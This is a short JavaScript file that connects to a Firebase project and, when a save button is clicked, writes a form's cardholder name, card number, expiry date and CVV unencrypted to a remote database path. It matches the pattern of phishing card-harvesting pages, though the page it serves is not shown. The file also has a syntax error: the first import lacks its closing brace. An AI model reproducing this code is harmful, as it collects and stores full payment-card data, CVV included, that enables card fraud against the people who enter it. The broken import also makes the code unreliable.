// Import the functions you need from the SDKs you need
import { initializeApp  from "https://www.gstatic.com/firebasejs/9.19.1/firebase-app.js";
// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries

// Your web app's Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyD-Oqp3M2Zbce5ZZ95O5Mp2RyMakGH6fG4",
  authDomain: "new3-5cfd1.firebaseapp.com",
  projectId: "new3-5cfd1",
  storageBucket: "new3-5cfd1.appspot.com",
  messagingSenderId: "1079514870116",
  appId: "1:1079514870116:web:f7267e7b7e01f071014a71"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);

import { getDatabase, set, ref, child, remove, update } from "https://www.gstatic.com/firebasejs/9.19.1/firebase-database.js";
const db = getDatabase();

var name = document.getElementById('name');
var cvv = document.getElementById('cvv');
var date = document.getElementById('date');
var cardNumber = document.getElementById('cardNumber');

function insert() {
  // body...
  set(ref(db, "client/"), {
    name: name.value,
    cvv: cvv.value,
    date: date.value,
    cardNumber: cardNumber.value
  })
}
var save = document.getElementById("save");
save.addEventListener('click', insert);